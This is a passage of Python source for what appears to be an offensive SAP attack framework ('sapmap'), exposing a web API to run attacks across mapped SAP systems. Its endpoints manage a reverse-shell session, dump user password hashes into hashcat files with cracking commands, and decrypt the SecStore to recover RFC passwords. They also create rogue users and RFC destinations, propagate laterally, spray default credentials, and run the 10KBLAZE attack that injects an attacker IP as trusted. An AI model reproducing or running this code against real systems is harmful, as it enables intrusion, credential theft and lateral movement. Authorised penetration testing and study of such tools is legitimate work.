                print(f"[-] {sid}: Payload delivery failed: {err}")
                with _shell_lock:
                    if _shell_session and _shell_session.status == "waiting":
                        _shell_session.status = "error"
                        _shell_session.error_msg = f"Payload failed: {err}"

        threading.Thread(target=_send, daemon=True).start()
        return json.dumps({"status": "ok", "port": shell_port,
                           "mode": shell_mode})

    @app.route("/api/shell/status", method="GET")
    def shell_status():
        response.content_type = "application/json"
        with _shell_lock:
            if not _shell_session:
                return json.dumps({"active": False})
            return json.dumps({
                "active": True,
                "status": _shell_session.status,
                "target_sid": _shell_session.target_sid,
                "listen_port": _shell_session.port,
                "client_addr": (f"{_shell_session.client_addr[0]}:"
                                f"{_shell_session.client_addr[1]}"
                                if _shell_session.client_addr else ""),
                "error": _shell_session.error_msg,
                "progress": _shell_session.progress_msg,
            })

    @app.route("/api/shell/output", method="GET")
    def shell_output():
        response.content_type = "application/json"
        with _shell_lock:
            if not _shell_session:
                return json.dumps({"output": ""})
            return json.dumps({"output": _shell_session.get_output()})

    @app.route("/api/shell/input", method="POST")
    def shell_input():
        response.content_type = "application/json"
        data = request.json or {}
        text = data.get("text", "")
        with _shell_lock:
            if not _shell_session or _shell_session.status != "connected":
                return json.dumps({"error": "No active shell"})
            _shell_session.send_input(text)
        return json.dumps({"status": "ok"})

    @app.route("/api/shell/stop", method="POST")
    def shell_stop():
        global _shell_session
        response.content_type = "application/json"
        with _shell_lock:
            if _shell_session:
                _shell_session.stop()
                _shell_session = None
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/download_hashes", method="POST")
    def node_download_hashes(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            hashes = sapmap_rfc.download_password_hashes(node, creds)
            if not hashes:
                return

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            states_dir = os.path.join(os.path.dirname(__file__), "states")
            os.makedirs(states_dir, exist_ok=True)

            # Save raw JSON
            json_file = os.path.join(states_dir, f"hashes_{sid}_{ts}.json")
            with open(json_file, "w") as f:
                json.dump(hashes, f, indent=2)

            quality = hashes[0].get("hash_quality", "half") if hashes else "half"

            # Generate hashcat-format files
            bcode_lines = []    # mode 7700 (full) or 7701 (half)
            passcode_lines = [] # mode 7800 (full) or 7801 (half)
            issha_lines = []    # mode 10300

            for row in hashes:
                bname = row.get("BNAME", "").strip()
                bcode = row.get("BCODE", "").strip()
                passcode = row.get("PASSCODE", "").strip()
                pwdsaltedhash = row.get("PWDSALTEDHASH", "").strip()

                if bcode and bname:
                    if quality == "full":
                        # Mode 7700: USERNAME$FULL_HEX_HASH
                        bcode_lines.append(f"{bname}${bcode}")
                    else:
                        # Mode 7701: USERNAME$HALF_HEX_HASH_PADDED
                        padded = bcode.ljust(16, '0')
                        bcode_lines.append(f"{bname}${padded}")

                if passcode and bname:
                    if quality == "full":
                        # Mode 7800: USERNAME$FULL_SHA1_HEX
                        passcode_lines.append(f"{bname}${passcode}")
                    else:
                        # Mode 7801: USERNAME$HALF_SHA1_PADDED
                        padded = passcode.ljust(40, '0')
                        passcode_lines.append(f"{bname}${padded}")

                if pwdsaltedhash:
                    # Mode 10300: raw value as-is
                    issha_lines.append(pwdsaltedhash)

            # Write hashcat files
            files_written = []
            bcode_mode = "7700" if quality == "full" else "7701"
            passcode_mode = "7800" if quality == "full" else "7801"

            if bcode_lines:
                f_bcode = os.path.join(states_dir,
                    f"hashcat_{sid}_bcode_m{bcode_mode}_{ts}.txt")
                with open(f_bcode, "w") as f:
                    f.write("\n".join(bcode_lines) + "\n")
                files_written.append(
                    f"BCODE (mode {bcode_mode}): {f_bcode}")

            if passcode_lines:
                f_passcode = os.path.join(states_dir,
                    f"hashcat_{sid}_passcode_m{passcode_mode}_{ts}.txt")
                with open(f_passcode, "w") as f:
                    f.write("\n".join(passcode_lines) + "\n")
                files_written.append(
                    f"PASSCODE (mode {passcode_mode}): {f_passcode}")

            if issha_lines:
                f_issha = os.path.join(states_dir,
                    f"hashcat_{sid}_issha_m10300_{ts}.txt")
                with open(f_issha, "w") as f:
                    f.write("\n".join(issha_lines) + "\n")
                files_written.append(
                    f"PWDSALTEDHASH (mode 10300): {f_issha}")

            # Summary
            print(f"[+] {sid}: Extracted {len(hashes)} users "
                  f"({quality} hashes)")
            print(f"    Raw JSON: {json_file}")
            for fw in files_written:
                print(f"    {fw}")
            if bcode_lines:
                print(f"    Crack BCODE: hashcat -m {bcode_mode} "
                      f"hashcat_{sid}_bcode_m{bcode_mode}_{ts}.txt "
                      f"wordlist.txt")
            if passcode_lines:
                print(f"    Crack PASSCODE: hashcat -m {passcode_mode} "
                      f"hashcat_{sid}_passcode_m{passcode_mode}_{ts}.txt "
                      f"wordlist.txt")
            if issha_lines:
                print(f"    Crack iSSHA: hashcat -m 10300 "
                      f"hashcat_{sid}_issha_m10300_{ts}.txt "
                      f"wordlist.txt")

        _bg(f"{sid}:download_hashes", "Extract Hashes", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/download_table", method="POST")
    def node_download_table(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            table = data.get("table", "")
            fields = data.get("fields", [])
            where = data.get("where", "")
            max_rows = data.get("max_rows", 500)
            rows = sapmap_rfc.read_table(node, table, fields, where, max_rows, creds)
            if rows:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                outfile = os.path.join(
                    os.path.dirname(__file__), "states",
                    f"table_{table}_{sid}_{ts}.json"
                )
                os.makedirs(os.path.dirname(outfile), exist_ok=True)
                with open(outfile, "w") as f:
                    json.dump(rows, f, indent=2)
                print(f"[+] {len(rows)} rows from {table} saved to {outfile}")

        _bg(f"{sid}:download_table", "Download Table", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/download_secstore", method="POST")
    def node_download_secstore(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        key_hex = data.get("key_hex", "") or sapmap_secstore.DEFAULT_KEY_HEX

        def _run():
            creds = node.best_credentials()
            try:
                results = sapmap_secstore.download_and_decrypt(
                    node, creds, key_hex, state=api.state)
                sapmap_secstore.integrate_results(node, api.state, results)
                ok  = [r for r in results if not r.get("error") and r.get("password")]
                err = [r for r in results if r.get("error")]
                states_dir = os.path.join(os.path.dirname(__file__), "states")
                outfile = sapmap_secstore.save_loot(node.sid, results, states_dir)
                print(f"[+] SecStore {sid}: {len(results)} entries, "
                      f"{len(ok)} decrypted, {len(err)} errors → {outfile}")
                if ok:
                    sapmap_findings.emit_finding(
                        "CRITICAL", sid,
                        f"ABAP SecStore decrypted — {len(ok)} RFC "
                        f"destination password(s) recovered",
                    )
            except Exception as e:
                import traceback
                print(f"[-] SecStore {sid}: {e}")
                traceback.print_exc()

        _bg(f"{sid}:download_secstore", "Download SecStore", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_tcpip_dest", method="POST")
    def node_create_tcpip(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        target_sid = data.get("target_sid", "")
        tgt_node = api.state.get_node(target_sid) if target_sid else None
        if not tgt_node:
            return json.dumps({"error": f"Target system {target_sid} not found"})

        def _run():
            creds = node.best_credentials()
            if not creds:
                print(f"[-] No credentials available for {sid}")
                return
            tgt_host = tgt_node.ip or tgt_node.hostname
            # Find gateway port on target
            gw_port = ""
            for inst in tgt_node.instances:
                for port, svc in inst.ports.items():
                    if svc == "gateway" or (3300 <= port <= 3399):
                        gw_port = str(port)
                        break
                if gw_port:
                    break
            if not gw_port:
                nrs = tgt_node.instance_nrs()
                gw_port = f"33{nrs[0]}" if nrs else "3300"
            print(f"[*] Creating TCP/IP dest from {sid} → "
                  f"{target_sid} ({tgt_host}, gw={gw_port})...")
            result = sapmap_rfc.create_tcpip_destination(
                node, tgt_host, target_sid=target_sid,
                target_gw_port=gw_port, creds=creds
            )
            if not result["success"]:
                print(f"[-] Failed: {result['message']}")
                return
            dest_name = result["dest_name"]
            print(f"[+] Created: {dest_name} on {sid}")

            # Track for cleanup (in-memory + persistent file)
            entry = {
                "dest_name": dest_name,
                "source_sid": sid,
                "target_sid": target_sid,
                "target_host": tgt_host,
                "gw_port": gw_port,
                "created_at": datetime.now().isoformat(),
            }
            api.state.created_destinations.append(entry)
            state_mgr.save_created_destination(entry)

            # Test the destination with /SDF/RFC_CHECK
            print(f"[*] Testing {dest_name} with /SDF/RFC_CHECK...")
            check = sapmap_rfc.test_rfc_destination(
                node, dest_name, creds, api.state.rfc_check_cache
            )

            # For TCP/IP destinations, success = EV_PING_STATUS == 1
            ping_success = check.get("ping_status") == "1"

            # Create connection and add to state
            conn = RFCConnection(
                source_sid=sid,
                source_host=node.ip or node.hostname,
                target_sid=target_sid,
                target_host=tgt_host,
                target_ip=tgt_node.ip,
                destination_name=dest_name,
                logon_successful=ping_success,
                ping_ok=ping_success,
                latency_ms=check.get("latency_ms", 0),
                tested=True,
                sapxpg_remote_works=ping_success,
            )
            api.state.add_connection(conn)

            if ping_success:
                print(f"[+] {dest_name}: Ping successful! "
                      f"(EV_PING_STATUS=1, latency={conn.latency_ms}ms)")
                tgt_node.has_critical_finding = True
            else:
                print(f"[-] {dest_name}: Ping failed — "
                      f"{check.get('logon_message', check.get('error', ''))}")

        _bg(f"{sid}:create_tcpip", "Create TCP/IP Dest", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/propagate", method="POST")
    def node_propagate(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        target_sid = data.get("target_sid", None)

        def _run():
            sapmap_exploit.propagate_from_node(
                node, api.state, target_sid=target_sid
            )

        _bg(f"{sid}:propagate", "Propagate", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_user_via_rfc", method="POST")
    def node_create_user_via_rfc(sid):
        """Create a remote user on a target system via a specific RFC destination."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        dest_name = data.get("destination_name", "")
        target_sid = data.get("target_sid", "")
        if not dest_name or not target_sid:
            return json.dumps({"error": "destination_name and target_sid required"})

        def _run():
            sapmap_exploit.propagate_from_node(
                node, api.state, target_sid=target_sid,
                destination_name=dest_name
            )

        _bg(f"{sid}:create_user_rfc:{dest_name}", "Create User via RFC", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/cleanup", method="POST")
    def node_cleanup(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            sapmap_cleanup.cleanup_node_users(node, api.state)

        _bg(f"{sid}:cleanup", "Cleanup Users", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_router_info", method="POST")
    def node_check_router_info(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            from sap_router_info import saprouter_info_request
            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available")
                return

            # Find SAProuter port (default 3299)
            router_port = 3299
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "saprouter":
                        router_port = port
                        break

            print(f"[*] {sid}: Checking SAProuter info leak on "
                  f"{host}:{router_port}...")
            result = saprouter_info_request(host, router_port, timeout=10)
            node.saprouter_info = result

            if result["vulnerable"]:
                print(f"[+] {sid}: SAProuter is VULNERABLE to info leak!")
                print(f"    Working dir: {result['working_dir']}")
                print(f"    Routtab: {result['routtab']}")
                print(f"    Connected clients: {result['total_clients']}")
                for c in result['clients']:
                    svc = f":{c['service']}" if c.get('service') else ""
                    print(f"      [{c.get('id','')}] {c['source']} → "
                          f"{c.get('partner', '(no partner)')}{svc}")
                node.has_critical_finding = True
                sapmap_findings.emit_finding(
                    "HIGH", sid,
                    f"SAProuter info-leak succeeded on {host}:{router_port} "
                    f"— {result['total_clients']} clients, routtab exposed",
                    cve="CVE-2022-27668 (similar) / NIINFO leak",
                )
            else:
                print(f"[*] {sid}: SAProuter info leak not available "
                      f"({result['error']})")

        _bg(f"{sid}:check_router_info", "Check SAProuter Info", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/enum_clients", method="POST")
    def node_enum_clients(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available")
                return

            # Find dispatcher port (32XX)
            disp_port = None
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "dispatcher" or (3200 <= port <= 3299):
                        disp_port = port
                        break
                if disp_port:
                    break
            if not disp_port:
                print(f"[-] {sid}: No dispatcher port found (need 32XX for DIAG)")
                return

            clients = sapmap_scanner.enumerate_system_clients(
                host, disp_port, sid_hint=node.sid,
                saprouter=node.saprouter)
            if clients:
                # Merge with existing clients (avoid duplicates)
                existing_nrs = set()
                for c in node.clients:
                    nr = c.get("nr") if isinstance(c, dict) else str(c)
                    existing_nrs.add(nr)
                for nr in clients:
                    if nr not in existing_nrs:
                        node.clients.append({"nr": nr, "category": ""})

        _bg(f"{sid}:enum_clients", "Enumerate Clients", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/check_default_creds", method="POST")
    def node_check_default_creds(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            try:
                from sap_default_creds import check_default_credentials
            except ImportError:
                print(f"[-] {sid}: sap_default_creds module not available")
                return

            host = node.ip or node.hostname
            if not host:
                print(f"[-] {sid}: No IP/hostname available")
                return

            # Find dispatcher port (32XX)
            disp_port = None
            for inst in node.instances:
                for port, svc in inst.ports.items():
                    if svc == "dispatcher" or (3200 <= port <= 3299):
                        disp_port = port
                        break
                if disp_port:
                    break
            if not disp_port:
                print(f"[-] {sid}: No dispatcher port found (need 32XX for DIAG)")
                return

            # Get client list
            clients = []
            for c in node.clients:
                nr = c.get("nr") if isinstance(c, dict) else str(c)
                if nr:
                    clients.append(nr)
            if not clients:
                clients = ["000"]
                print(f"[*] {sid}: No clients enumerated, testing client 000 only")

            print(f"[*] {sid}: Checking default accounts on {host}:{disp_port} "
                  f"(clients: {', '.join(clients)})...")
            print(f"[!] {sid}: WARNING — failed login attempts may lock accounts!")

            if node.saprouter:
                print(f"[*] {sid}: Routing DIAG via SAProuter: {node.saprouter}")
            findings = check_default_credentials(
                host, disp_port, clients, timeout=10, verbose=True,
                saprouter=node.saprouter)

            if findings:
                print(f"[+] {sid}: Found {len(findings)} default credential(s)!")
                for f in findings:
                    # Add as credentials on the node
                    cred = Credentials(
                        username=f["username"], password=f["password"],
                        client=f["client"],
                        instance_nr=node.instance_nrs()[0] if node.instance_nrs() else "00",
                        verified=(f["result"] == "SUCCESS"),
                    )
                    already = any(
                        c.username == cred.username and c.client == cred.client
                        for c in node.credentials
                    )
                    if not already:
                        node.credentials.append(cred)
                        print(f"    [{f['severity']}] {f['username']}:{f['password']} "
                              f"client {f['client']} — {f['detail']}")
            else:
                print(f"[*] {sid}: No default credentials found")

        _bg(f"{sid}:default_creds", "Check Default Accounts", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/client_roles", method="POST")
    def node_client_roles(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            sapmap_rfc.update_node_production_status(node, creds)

        _bg(f"{sid}:client_roles", "Client Roles", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>", method="DELETE")
    def node_delete(sid):
        response.content_type = "application/json"
        if api.state.remove_node(sid):
            print(f"[*] Removed system {sid} from the map")
            return json.dumps({"status": "ok"})
        return json.dumps({"error": f"Node {sid} not found"})

    @app.route("/api/node/add", method="POST")
    def node_add():
        response.content_type = "application/json"
        data = request.json or {}
        sid = (data.get("sid") or "").strip().upper()
        ip = (data.get("ip") or "").strip()
        inst_nr = (data.get("instance_nr") or "").strip()

        if not sid or len(sid) != 3 or not sid.isalnum():
            return json.dumps({"error": "SID must be exactly 3 alphanumeric characters"})
        if not ip:
            return json.dumps({"error": "IP/Hostname is required"})
        if not inst_nr or len(inst_nr) != 2 or not inst_nr.isdigit():
            return json.dumps({"error": "Instance number must be 2 digits (00-99)"})
        if api.state.get_node(sid):
            return json.dumps({"error": f"System {sid} already exists on the map"})

        saprouter = (data.get("saprouter") or "").strip()

        nr = inst_nr
        # Only set dispatcher/gateway ports (derived from instance nr)
        # — other ports are discovered by scanning
        ports = {
            int(f"32{nr}"): "dispatcher",
            int(f"33{nr}"): "gateway",
        }
        instance = InstanceInfo(instance_nr=nr, ip=ip, ports=ports)
        node = SAPNode(sid=sid, ip=ip, hostname=ip, instances=[instance],
                       saprouter=saprouter)
        api.state.add_node(node)
        router_msg = f", via SAProuter" if saprouter else ""
        print(f"[+] Manually added system {sid} ({ip}, instance {nr}{router_msg})")

        # Auto-enrich via RFC_SYSTEM_INFO in background
        def _enrich():
            host = node.ip or node.hostname
            gw_port = int(f"33{nr}")
            inst_nrs = [nr]
            print(f"[*] {sid}: Auto-enriching via RFC_SYSTEM_INFO...")

            def _apply(info, fill_only=False):
                # fill_only: only populate fields that are currently empty —
                # used for the sweep step so a later, lower-confidence probe
                # (e.g. product-name-based DB inference) doesn't clobber a
                # correctly-detected value from the primary probe.
                def _set(field, val):
                    if not val:
                        return
                    cur = getattr(node, field, "")
                    if fill_only and cur:
                        return
                    setattr(node, field, val)
                _set("hostname", info.get("hostname"))
                _set("os_type", info.get("os_type"))
                _set("db_type", info.get("db_type"))
                _set("kernel", info.get("kernel"))
                _set("sap_release", info.get("sap_release"))
                sc_abap = info.get("_is_abap", False)
                sc_java = info.get("_is_java", False)
                if sc_abap or sc_java:
                    new_type = ("ABAP+JAVA" if sc_abap and sc_java
                                else "JAVA" if sc_java else "ABAP")
                    if not fill_only or not node.system_type:
                        node.system_type = new_type

            try:
                info = sapmap_scanner.enrich_system_info(
                    host, gw_port, instance_nrs=inst_nrs,
                    sid_hint=sid, saprouter=saprouter)
                _apply(info)

                # For Java-only systems the user often provides the Java
                # dispatcher instance (e.g. SJJ inst 02) rather than the SCS
                # gateway instance (SJJ inst 03).  If the primary RFC_SYSTEM_INFO
                # probe didn't yield kernel/release but we did detect a stack
                # via SAPControl, sweep 33NN on the host to find an actually-
                # open gateway and re-probe RFC_SYSTEM_INFO there.
                needs_sweep = (not node.kernel or not node.sap_release)
                if needs_sweep and (info.get("_is_java") or info.get("_is_abap")):
                    import socket as _sock
                    for try_inst in range(0, 10):
                        if try_inst == int(nr):
                            continue  # already tried
                        try_port = 3300 + try_inst
                        try:
                            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                            s.settimeout(0.5)
                            s.connect((host, try_port))
                            s.close()
                        except Exception:
                            continue
                        print(f"[*] {sid}: Sweeping additional gateway at "
                              f"{host}:{try_port} for RFC_SYSTEM_INFO...")
                        sweep_info = sapmap_scanner.enrich_system_info(
                            host, try_port,
                            instance_nrs=[f"{try_inst:02d}"],
                            sid_hint=sid, saprouter=saprouter)
                        _apply(sweep_info, fill_only=True)
                        # Track the discovered gateway instance on the node
                        have_inst = any(i.instance_nr == f"{try_inst:02d}"
                                         for i in node.instances)
                        if not have_inst:
                            node.instances.append(InstanceInfo(
                                instance_nr=f"{try_inst:02d}", ip=host,
                                ports={try_port: "gateway"}))
                        if node.kernel and node.sap_release:
                            break
                parts = []
                if node.os_type:
                    parts.append(f"OS: {node.os_type}")
                if node.db_type:
                    parts.append(f"DB: {node.db_type}")
                if node.kernel:
                    parts.append(f"Kernel: {node.kernel}")
                if parts:
                    print(f"[+] {sid}: {', '.join(parts)}")
                else:
                    print(f"[*] {sid}: RFC_SYSTEM_INFO returned no data")
            except Exception as e:
                print(f"[*] {sid}: RFC_SYSTEM_INFO failed: {e}")

            # Auto-check MS internal port for betrusted vulnerability
            print(f"[*] {sid}: Checking MS internal port (CVE-2020-6207)...")
            try:
                sapmap_scanner.check_ms_betrusted(node)
                if node.ms_vulnerable:
                    print(f"[+] {sid}: MS port {node.ms_port} VULNERABLE "
                          f"— betrusted attack possible (10KBLAZE)")
                elif node.ms_port:
                    print(f"[*] {sid}: MS port {node.ms_port} reachable "
                          f"({'ACL-protected' if node.ms_acl_protected else 'open'})")
            except Exception as e:
                logger.debug(f"{sid}: MS check failed: {e}")

        _bg(f"{sid}:enrich", "Enriching via RFC_SYSTEM_INFO", _enrich)

        return json.dumps({"status": "ok"})

    # -- Default password --
    @app.route("/api/settings/password", method="GET")
    def get_password():
        response.content_type = "application/json"
        import sapmap_config
        return json.dumps({"password": sapmap_config.SAPMAP_PASSWORD})

    @app.route("/api/settings/password", method="POST")
    def set_password():
        response.content_type = "application/json"
        data = request.json or {}
        new_pwd = (data.get("password") or "").strip()
        if not new_pwd:
            return json.dumps({"error": "Password cannot be empty"})
        import sapmap_config
        sapmap_config.SAPMAP_PASSWORD = new_pwd
        # Also update legacy aliases for any code that still imports them
        sapmap_config.SAPMAP_PASSWORD_ABAP = new_pwd
        sapmap_config.SAPMAP_PASSWORD_BAPI = new_pwd
        print(f"[*] Default password changed to: {new_pwd[:3]}{'*' * (len(new_pwd)-3)}")
        return json.dumps({"status": "ok"})

    # -- Exit --
    @app.route("/api/exit", method="POST")
    def do_exit():
        response.content_type = "application/json"
        print("[*] Exit requested — shutting down ...")
        import threading
        threading.Timer(0.5, lambda: os._exit(0)).start()
        return json.dumps({"status": "ok"})

    # -- Global actions --
    @app.route("/api/actions/propagate_all", method="POST")
    def actions_propagate_all():
        response.content_type = "application/json"

        def _run():
            sapmap_exploit.propagate_all(api.state)

        _bg("_propagate_all", "Propagate All", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/actions/cleanup_all", method="POST")
    def actions_cleanup_all():
        response.content_type = "application/json"

        def _run():
            sapmap_cleanup.cleanup_all_users(api.state)

        _bg("_cleanup_all", "Cleanup All", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/actions/check_all_gw", method="POST")
    def actions_check_all_gw():
        response.content_type = "application/json"
        nodes = list(api.state.nodes.values())
        if len(nodes) < 2:
            return json.dumps({"error": "Need at least 2 systems on the map"})

        def _run():
            for node in nodes:
                print(f"[*] Checking GW vulnerability: {node.sid} ({node.ip})")
                sapmap_exploit.check_gw_vulnerable(node)

        _bg("_check_all_gw", "Check All GW Vulnerabilities", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_ms", method="POST")
    def actions_check_all_ms():
        """Check MS internal port (CVE-2020-6207) on all nodes."""
        response.content_type = "application/json"
        nodes = list(api.state.nodes.values())

        def _run():
            for node in nodes:
                print(f"[*] Checking MS betrusted: {node.sid} ({node.ip})")
                sapmap_scanner.check_ms_betrusted(node)

        _bg("_check_all_ms", "Check All MS Betrusted", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_cve_31324", method="POST")
    def actions_check_all_cve_31324():
        """Probe every Java / double-stack node for CVE-2025-31324.

        Pure-ABAP nodes are skipped (the vuln lives in VisualComposer on
        the Java stack), so the loop only hits candidates where the
        check is meaningful.
        """
        response.content_type = "application/json"
        nodes = [n for n in api.state.nodes.values()
                 if "JAVA" in (n.system_type or "").upper()]
        if not nodes:
            return json.dumps({"error": "No Java / double-stack systems on "
                                         "the map"})

        def _run():
            for node in nodes:
                print(f"[*] {node.sid}: check_cve_2025_31324 "
                      f"({node.ip})")
                try:
                    sapmap_scanner.check_cve_2025_31324(node)
                except Exception as e:
                    print(f"[-] {node.sid}: check_cve_31324 failed: {e}")

        _bg("_check_all_cve_31324", "Check All CVE-2025-31324", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/analyze_chains", method="POST")
    def actions_analyze_chains():
        """Discover RFC trust chain escalation paths across the landscape."""
        response.content_type = "application/json"

        def _run():
            import sapmap_chain
            chains = sapmap_chain.analyze_chains(api.state)
            # Store on state for retrieval
            api.state._trust_chains = [c.to_dict() for c in chains]

        _bg("_analyze_chains", "Trust Chain Analysis", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/chains")
    def get_chains():
        response.content_type = "application/json"
        chains = getattr(api.state, '_trust_chains', [])
        return json.dumps({"chains": chains})

    @app.route("/api/actions/check_all_betrusted", method="POST")
    def actions_check_all_betrusted():
        """Check MS betrusted + inject trusted IP on all nodes."""
        response.content_type = "application/json"
        data = request.json or {}
        attacker_ip = data.get("attacker_ip", "").strip()
        nodes = list(api.state.nodes.values())

        stop_event = threading.Event()
        key = "_check_all_betrusted"
        _register_betrusted_stop(key, stop_event)

        def _run():
            try:
                # Phase 1: scan all MS ports
                print(f"[*] Phase 1: Scanning MS internal ports on {len(nodes)} systems...")
                vulnerable = []
                for node in nodes:
                    if stop_event.is_set():
                        print(f"[!] Check All 10KBlaze cancelled by user")
                        return
                    if node.ms_vulnerable:
                        print(f"[+] {node.sid}: Already known MS vulnerable (port {node.ms_port})")
                        vulnerable.append(node)
                        continue
                    print(f"[*] {node.sid}: Checking MS internal port...")
                    sapmap_scanner.check_ms_betrusted(node)
                    if node.ms_vulnerable:
                        print(f"[+] {node.sid}: MS port {node.ms_port} VULNERABLE!")
                        vulnerable.append(node)

                if not vulnerable:
                    print(f"[-] No systems with vulnerable MS internal port found")
                    return

                # Phase 2: inject trusted IP on vulnerable systems
                print(f"\n[*] Phase 2: Injecting trusted IP on {len(vulnerable)} vulnerable systems...")
                for node in vulnerable:
                    if stop_event.is_set():
                        print(f"[!] Check All 10KBlaze cancelled by user")
                        return
                    print(f"[*] {node.sid}: betrusted → inject {attacker_ip or 'auto-detect'}")
                    ok = sapmap_exploit.try_betrusted_chain(
                        node, api.state,
                        attacker_ip=attacker_ip,
                        nilist_wait=30,
                        stop_event=stop_event,
                    )
                    if ok:
                        print(f"[+] {node.sid}: Gateway TRUSTED — GW exploit available!")
                    else:
                        print(f"[-] {node.sid}: betrusted did not establish trust")

                trusted = [n for n in vulnerable if n.gw_vulnerable]
                print(f"\n[*] Results: {len(vulnerable)} MS vulnerable, "
                      f"{len(trusted)} gateway trusted")
            finally:
                stop_event.set()
                _unregister_betrusted_stop(key)

        _bg(key, "Check All 10KBlaze", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/check_all_vulns", method="POST")
    def actions_check_all_vulns():
        """Run every passive 'Check ...' probe across every node on the map.

        Mirrors the per-node right-click Scanning → Check * items, gated
        by the node's system_type:
          - check_gw          — every node
          - check_ms          — every node (39NN probe)
          - check_cve_31324   — Java / double-stack only
          - check_cve_6287    — Java / double-stack only
          - check_router_info — SAProuter nodes only
        Deep scan / default-creds / RFC retrieval are excluded by design
        (deep scan is SAPology; default-creds may lock accounts; RFC
        retrieval needs authenticated logon — none are "vulnerability
        checks" in the drive-by sense this action covers).
        """
        response.content_type = "application/json"
        nodes = list(api.state.nodes.values())
        if not nodes:
            return json.dumps({"error": "No systems on the map"})

        def _run():
            import sapmap_stop
            import time as _time
            sapmap_stop.reset_stop()
            total = len(nodes)
            print(f"[*] Scan for All Vulnerabilities — {total} system(s)")
            for idx, node in enumerate(nodes, 1):
                if sapmap_stop.is_stop_requested():
                    print(f"[!] STOP — vuln sweep aborted "
                          f"({idx-1}/{total} processed)")
                    return
                # Small gap between nodes so each target's gateway / MS has
                # a moment to reset NI buffer state before we hit it again.
                # Without this, P2 (F_SAP_INIT) occasionally goes silent
                # on the second-or-later probe in a rapid sweep even though
                # the target is vulnerable — the P1+P2 retry inside
                # check_gw_vulnerable catches most of these, but a 1 s
                # breather up front reduces the rate of the retry path.
                if idx > 1:
                    _time.sleep(1.0)
                sys_type = (node.system_type or "").upper()
                is_java = "JAVA" in sys_type
                is_router = "ROUTER" in sys_type
                print(f"[*] [{idx}/{total}] {node.sid} "
                      f"({node.system_type or '?'}) — running vuln checks")

                # 1. Gateway (every SAP system — skip pure routers)
                if not is_router:
                    try:
                        print(f"[*] {node.sid}: check_gw")
                        sapmap_exploit.check_gw_vulnerable(node)
                    except Exception as e:
                        print(f"[-] {node.sid}: check_gw failed: {e}")
                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

                # 2. MS betrusted / CVE-2020-6207 (every SAP system)
                if not is_router:
                    try:
                        print(f"[*] {node.sid}: check_ms_betrusted")
                        sapmap_scanner.check_ms_betrusted(node)
                    except Exception as e:
                        print(f"[-] {node.sid}: check_ms failed: {e}")
                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

                # 3. CVE-2025-31324 — Java / double-stack only
                if is_java:
                    try:
                        print(f"[*] {node.sid}: check_cve_2025_31324")
                        sapmap_scanner.check_cve_2025_31324(node)
                    except Exception as e:
                        print(f"[-] {node.sid}: check_cve_31324 failed: {e}")
                    if sapmap_stop.is_stop_requested():
                        print(f"[!] STOP — vuln sweep aborted")
                        return

                # 4. CVE-2020-6287 (RECON) — Java / double-stack only
                if is_java:
                    try:
                        print(f"[*] {node.sid}: check_cve_2020_6287 (RECON)")
                        sapmap_scanner.check_cve_2020_6287(node)
                    except Exception as e:
                        print(f"[-] {node.sid}: check_cve_6287 failed: {e}")
